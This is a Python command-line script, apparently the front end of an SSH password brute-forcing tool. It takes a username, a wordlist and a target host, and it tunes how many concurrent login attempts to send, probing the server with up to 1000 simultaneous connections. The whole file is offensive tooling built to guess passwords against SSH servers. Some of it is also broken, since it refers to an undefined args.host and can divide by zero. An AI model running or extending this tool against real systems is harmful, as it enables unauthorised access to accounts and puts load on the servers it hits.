import argparse
import asyncio, asyncssh
from utility import Utility
from asyncsshpool import BruteForceSSH

mode="""all modes are able to recover requests that were lost
or caught by exceptions and execute them at a later time.
1)  schedule all word list passwords in event loop 
    and will try execute all requests concurrently. 
    this can be faster since the request will be 
    generated randomly and therefore last password 
    may be processed earlier than other precedents
    
2)  send requests in chunks of N elements
    it is slower but guarantees a higher ratio
    of successful/failed requests. less stress 
    on the ssh server
    
3)  send requests in chunks of N elements and 
    wait for all requests to complete before 
    try the next chunk of requests
"""

sem ="""set a semaphore to limit the number of simultaneous requests
if < 0  the tool will try to find out the optimal 
        ratio for simultaneous requests
else    Default/Passed value is used
"""

parser = argparse.ArgumentParser(
        prog="brute.py",
        description="- [ Options ] -",
        formatter_class=argparse.RawTextHelpFormatter,
        )
parser.add_argument('-u', '--user',     type=str, metavar='', required=True, help='user')
parser.add_argument('-w', '--wordlist', type=str, metavar='', required=True, help='password wordlist')
parser.add_argument('-a', '--address',  default="127.0.0.1", type=str, metavar='', required=False, help='host address')
parser.add_argument('-p', '--port',     default=22, type=int, metavar='', required=False, help='port to connect to host')
parser.add_argument('-m', '--mode',     default=1, type=int, metavar='', required=False, help=mode)
parser.add_argument('--sem',            default=75, type=int, metavar='', required=False, help=sem)
parser.add_argument('--max-workers',    default=0, type=int, metavar='', required=False, help='set the maximum number of workers of the ThreadpoolExecutor\nelse standard will be used [number of phisical core * 2]')
parser.add_argument('--max-retries',    default=3, type=int, metavar='', required=False, help='set the maximum number of retries for request if fails')
parser.add_argument('--async-sleep',    default=0, type=float, metavar='', required=False, help='sleep for a specified amount of seconds before retrying')

group = parser.add_mutually_exclusive_group()
group.add_argument('-q', '--quiet', action='store_true', help='print quiet')
group.add_argument('-v', '--verbose', action='store_true', help='print verbose')
args = parser.parse_args()

def calculateConcurrency():
    N = 1000
    while True:
        
        async def run_client(host: str, port: int, command: str) -> asyncssh.SSHCompletedProcess:
            async with asyncssh.connect(host, username="TestUsername", password="TestPassword", port=port, known_hosts=None, keepalive_interval=100) as conn:
                return await conn.run(command)

        async def run_multiple_clients(host: str, port: int) -> None:
            succ: int = 0
            err: int = 0
            hosts: list = N * [host]
            tasks: list = [run_client(host, port, 'echo "Hello from ur new hacking station :) " ; ls') for host in hosts]
            results: list = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, asyncssh.PermissionDenied):
                    succ += 1
                elif isinstance(result, Exception):
                    err += 1
                else:
                    succ += 1
            return succ, err
        
        print(f"\33[1;36;1mtrying with {N} concurrently request...")
        succ, err = asyncio.run(run_multiple_clients(args.host, args.port))
        print(f"\33[1;36;1mRequest Intercepted by Exception:\t{err}\nRequest succesfully sent:\t\t{succ}")
        if err > succ + 20:
            print(f"\33[1;31;1mthe gap is too big try to lower rps...\n")
            N = N >> 1
        elif succ / err < 1.4:
            print(f"\33[1;33;1mNearly to optimal gap try to lower rps a little bit...\n")
            N = N - 5 
        else:
            print(f"\33[1;32;1mthe gap is acceptable... start with: {N} rps\n")
            return N
        if N < 95:
            return 95

if __name__ == '__main__':
    Utility(args.address, args.port, args.wordlist)
    if args.sem < 0:
        args.sem = calculateConcurrency()
    
    print(args)
    BruteForceSSH(
        args.user,
        args.address,
        args.port,
        args.wordlist,
        args.mode,
        args.sem,
        args.max_workers,
        args.max_retries,
        args.async_sleep,
        args.verbose,
        args.quiet
    ).run()
    